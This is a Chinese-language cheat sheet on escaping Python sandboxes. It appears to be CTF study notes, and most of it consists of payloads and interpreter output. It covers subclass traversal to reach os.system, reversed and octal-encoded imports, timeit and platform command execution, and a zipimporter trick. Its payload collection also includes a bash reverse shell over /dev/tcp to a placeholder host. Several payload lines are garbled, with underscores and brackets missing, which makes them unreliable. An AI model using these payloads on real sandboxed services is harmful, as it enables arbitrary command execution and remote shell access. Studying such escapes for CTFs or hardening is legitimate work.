沙箱
================================

常用函数
--------------------------------
- eval / exec / compile
- dir / type
- globals / locals / vars
- getattr / setattr

沙箱逃逸
--------------------------------
- 魔术方法
	::
	
		第一个是类具有的——__dict__魔术方法
		第二个是实例、类、函数都具有的——__getattribute__魔术方法

		dir([]) #实例
		dir([].class) #类
		dir([].append) #函数
		
		#查看实例中支持的方法
		>>> class haha:
		...     a=7
		...
		>>> dir(haha)
		['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'a']

		#查看类中支持的方法/对象
		>>> dir([].__class__)
		['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
		>>> dir([].copy.__class__)
		['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']


		#查看具体函数中支持的方法
		>>> dir([].__class__.__base__.__subclasses__()[72].__init__)
		['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__name__', '__ne__', '__new__', '__objclass__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']


		#使用__dict__调用[].__class__的__init__方法
		>>> [].__class__.__dict__['__init__']
		<slot wrapper '__init__' of 'list' objects>
		#使用__getattribute__调用[].__class__的__init__方法
		>>> [].__class__.__getattribute__([],'__init__')
		<method-wrapper '__init__' of list object at 0x000001BAB90317C0>
		#第一个返回的是个方法，第二个返回一个实例空间的方法
		#通常构造payload1的时候：
		[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os']
		只有第一种的方法（dict）才具有__globals__


- 在父类中寻找可用的模块，最常见payload是 ``().__class__.__bases__[0].__subclasses__()`` 或者用魔术方法获取全局作用域 ``__init__.__func__.__globals__``
	::
	
		import site
		os = reload(site.os)
		os.system('whoami')
		
		#A->os示例

		>>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
		...
		(0, <type 'type'>)
		(1, <type 'weakref'>)
		(2, <type 'weakcallableproxy'>)
		(3, <type 'weakproxy'>)
		(4, <type 'int'>)
		(5, <type 'basestring'>)
		(6, <type 'bytearray'>)
		(7, <type 'list'>)
		(8, <type 'NoneType'>)
		(9, <type 'NotImplementedType'>)
		(10, <type 'traceback'>)
		(11, <type 'super'>)
		(12, <type 'xrange'>)
		(13, <type 'dict'>)
		(14, <type 'set'>)
		(15, <type 'slice'>)
		(16, <type 'staticmethod'>)
		(17, <type 'complex'>)
		(18, <type 'float'>)
		(19, <type 'buffer'>)
		(20, <type 'long'>)
		(21, <type 'frozenset'>)
		(22, <type 'property'>)
		(23, <type 'memoryview'>)
		(24, <type 'tuple'>)
		(25, <type 'enumerate'>)
		(26, <type 'reversed'>)
		(27, <type 'code'>)
		(28, <type 'frame'>)
		(29, <type 'builtin_function_or_method'>)
		(30, <type 'instancemethod'>)
		(31, <type 'function'>)
		(32, <type 'classobj'>)
		(33, <type 'dictproxy'>)
		(34, <type 'generator'>)
		(35, <type 'getset_descriptor'>)
		(36, <type 'wrapper_descriptor'>)
		(37, <type 'instance'>)
		(38, <type 'ellipsis'>)
		(39, <type 'member_descriptor'>)
		(40, <type 'file'>)
		(41, <type 'PyCapsule'>)
		(42, <type 'cell'>)
		(43, <type 'callable-iterator'>)
		(44, <type 'iterator'>)
		(45, <type 'sys.long_info'>)
		(46, <type 'sys.float_info'>)
		(47, <type 'EncodingMap'>)
		(48, <type 'fieldnameiterator'>)
		(49, <type 'formatteriterator'>)
		(50, <type 'sys.version_info'>)
		(51, <type 'sys.flags'>)
		(52, <type 'exceptions.BaseException'>)
		(53, <type 'module'>)
		(54, <type 'imp.NullImporter'>)
		(55, <type 'zipimport.zipimporter'>)
		(56, <type 'posix.stat_result'>)
		(57, <type 'posix.statvfs_result'>)
		(58, <class 'warnings.WarningMessage'>)
		(59, <class 'warnings.catch_warnings'>)
		(60, <class '_weakrefset._IterationGuard'>)
		(61, <class '_weakrefset.WeakSet'>)
		(62, <class '_abcoll.Hashable'>)
		(63, <type 'classmethod'>)
		(64, <class '_abcoll.Iterable'>)
		(65, <class '_abcoll.Sized'>)
		(66, <class '_abcoll.Container'>)
		(67, <class '_abcoll.Callable'>)
		(68, <type 'dict_keys'>)
		(69, <type 'dict_items'>)
		(70, <type 'dict_values'>)
		(71, <class 'site._Printer'>)
		(72, <class 'site._Helper'>)
		(73, <type '_sre.SRE_Pattern'>)
		(74, <type '_sre.SRE_Match'>)
		(75, <type '_sre.SRE_Scanner'>)
		(76, <class 'site.Quitter'>)
		(77, <class 'codecs.IncrementalEncoder'>)
		(78, <class 'codecs.IncrementalDecoder'>)
		>>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']
		<module 'os' from '/usr/lib/python2.7/os.pyc'

		#实例2
		>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.keys()
		['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']
		>>> a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]
		>>>>a
		<module 'os' from '/usr/lib/python2.7/os.pyc'>
		#成功导入继续利用
		>>>a.__dict__.keys().index('system')
		79
		>>> a.__dict__.keys()[79]
		'system'
		>>> b=a.__dict__.values()[79]
		>>> b
		<built-in function system>
		>>> b('whoami')
		root

- pickle 模块
	+ pickle 实现任意代码执行，生成 payload 可以使用 ``https://gist.github.com/freddyb/3360650``
- timeit
	::
	
		import timeit
		timeit.timeit("import('os').system('dir')",number=1)
		#coding:utf-8 import timeit timeit.timeit("import('os').system('')", number=1)
- exec/eval
	::
	
		eval('import("os").system("dir")')
- platform
	::
	
		import platform
		print platform.popen('dir').read()
		import platform platform.popen('id', mode='r', bufsize=-1).read()
- 花式import
	::
		
		import..os
		import...os
		import:import('os')，import, importlib:importlib.import_module('os').system('ls')
		
		python2中支持
		execfile('/usr/lib/python2.7/os.py'),python2中支持
		system('ls')
		
		python3中支持
		with open('/usr/lib/python3.6/os.py','r') as f:
		exec(f.read())
		system('ls')
- 花式处理字符串
	::
	
		__import__('so'[::-1]).system('ls')	#逆序打印
		
		b = 'o'
		a = 's'
		__import__(a+b).system('ls')	#字符拼接
		
		eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])	#eval函数
		exec(')"imaohw"(metsys.so ;so tropmi'[::-1])	#exec函数
- 恢复sys.modules
	::
	
		sys.modules['os'] = 'not allowed' 
		del sys.modules['os']
		import os
		os.system('ls')
		
		#__builtins__的导入方法
		(lambda x:1).__globals__['__builtins__'].eval("__import__('os').system('ls')")
		(lambda x:1).__globals__['__builtins__'].__dict__['eval']("__import__('os').system('ls')")
- 花式执行函数
	::
	
		import os
		getattr(os, 'metsys'[::-1])('whoami')
		#如果不让出现import
		getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
- exec十六进制payload
	::
	
		__import__('os').system('ls')
		\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51
		exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")

小结/思路
--------------------------------
一般逃逸使用这几个库来尝试：os,subprocess,commands
如果都被ban了可以尝试预备内容中谈到的两个魔术方法来绕过字符串的限制，或者使用内建函数来绕过。

payload集锦
--------------------------------
	::
	
		print [].class.base.subclasses()40.read() #查看文件

		().class.bases[0].subclasses()40.read()
		相当于:().class.bases[0].subclasses()40).read() #字符串的处理上还可以用其他的很多

		[].class.base.subclasses()[60].init.getattribute(‘func_global’+‘s’)[‘linecache’].dict.values()[12]>

		print [].class.base.subclasses()[59].init.func_globals[‘linecache’].dict.values()[12].dict.values()144 linecache中查找os模块执行系统命令

		getattr(import(‘types’).builtins’tropmi’[::-1], ‘mets’ ‘ys’[::-1])(‘whoami’)

		().class.bases[0].subclasses()[59].init.func_globals[‘linecache’].dict[‘o’+‘s’].dict’sy’+‘stem’

		().class.bases[0].subclasses()[59].init.getattribute(‘func_global’+‘s’)[‘linecache’].dict[‘o’+‘s’].dict’popen’.read()

		print(().class.bases[0].subclasses()[59].init.func_globals[‘linecache’].dict[‘o’+‘s’].dict’sy’+‘stem’)

		{}.class.bases[0].subclasses()[71].getattribute({}.class.bases[0].subclasses()[71].init.func,‘func’+’_global’ +‘s’)[‘o’+‘s’].popen(‘bash -c “bash -i >& /dev/tcp/xxx/xxx 0<&1 2>&1”’) #自模块中寻找os模块 执行系统命令

		print [].class.base.subclasses()40.read()

		print [].class.base.subclasses()40.read()

		print [].class.base.subclasses()40.read()

		print [].class.base.subclasses()40.read() #读取重要信息

		code = “PK\x03\x04\x14\x03\x00\x00\x08\x00\xec\xb9\x9cL\x15\xa5\x99\x18;\x00\x00\x00>\x00\x00\x00\n\x00\x00\x00Err0rzz.pySV\xd0\xd5\xd2UH\xceO\xc9\xccK\xb7R(-I\xd3\xb5\x00\x89pqe\xe6\x16\xe4\x17\x95(\xe4\x17sq\x15\x14e\xe6\x81Xz\xc5\x95\xc5%\xa9\xb9\x1a\xea9\xc5\n\xba\x899\xea\x9a\\x00PK\x01\x02?\x03\x14\x03\x00\x00\x08\x00\xec\xb9\x9cL\x15\xa5\x99\x18;\x00\x00\x00>\x00\x00\x00\n\x00$\x00\x00\x00\x00\x00\x00\x00 \x80\xa4\x81\x00\x00\x00\x00Err0rzz.py\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\x00\xd6\x06\xb2p\xdf\xd3\x01\x80\x00\xads\xf9\xa7\xd4\x01\x80\x00\xads\xf9\xa7\xd4\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\\x00\x00\x00c\x00\x00\x00\x00\x00”
		print [].class.base.subclasses()40.write(code)
		print [].class.base.subclasses()40.read()
		[].class.base.subclasses()55.load_module(‘Err0rzz’) #构造zip module使用zipimporter

		x = [x for x in [].class.base.subclasses() if x.name == ‘ca’+‘tch_warnings’][0].init

		x.getattribute(“func_global”+“s”)[‘linecache’].dict[‘o’+‘s’].dict’sy’+‘stem’

		x.getattribute(“func_global”+“s”)[‘linecache’].dict[‘o’+‘s’].dict[‘sy’+‘stem’](‘l’+‘s /home/ctf’)

		x.getattribute(“func_global”+“s”)[‘linecache’].dict[‘o’+‘s’].dict’sy’+‘stem’

防御
--------------------------------
Python官方给出了一些防御的建议

- 使用Jython并尝试使用Java平台来锁定程序的权限
- 使用fakeroot来避免
- 使用一些rootjail的技术
